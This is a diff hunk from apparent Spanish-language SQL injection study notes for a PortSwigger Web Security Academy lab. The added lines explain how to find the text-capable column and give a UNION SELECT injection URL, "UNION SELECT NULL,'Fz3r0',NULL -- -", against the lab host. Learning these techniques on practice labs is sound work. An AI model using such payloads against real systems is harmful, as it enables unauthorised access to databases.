@@ -74,8 +74,11 @@ https://0aff002b034894bd8089e9e3001100a0.web-security-academy.net/filter?categor
 
 ![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/600fb155-e0c3-437c-96f9-e04ba315f31f)
 
+Para Fuzzear lso numeros se debe poner algún string o algo entre cada NULL, en este caso el segundo NULL es el vulnerable
 
-
+````
+https://0aff002b034894bd8089e9e3001100a0.web-security-academy.net/filter?category=Lifestyle'  UNION SELECT NULL,'Fz3r0',NULL -- -
+````
 
 
 
